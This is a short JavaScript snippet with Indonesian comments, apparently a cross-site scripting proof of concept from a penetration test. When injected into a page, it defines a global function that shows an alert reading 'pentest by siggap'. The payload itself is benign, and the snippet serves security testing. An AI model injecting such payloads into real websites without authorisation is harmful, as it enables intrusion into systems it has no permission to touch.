(function(){
  if (window.xss_trigred) return; // jangan override jika sudah ada
  window.xss_trigred = function() {
    try {
      alert('pentest by siggap');
    } catch (e) {
      console.log('[XSS PoC] alert failed:', e);
    }
  };
  // optional: beri petunjuk ringan di console tapi tidak mengganggu UI
  console.info('[XSS PoC] fungsi xss_trigred() tersedia — panggil xss_trigred() di console untuk verifikasi.');
})();
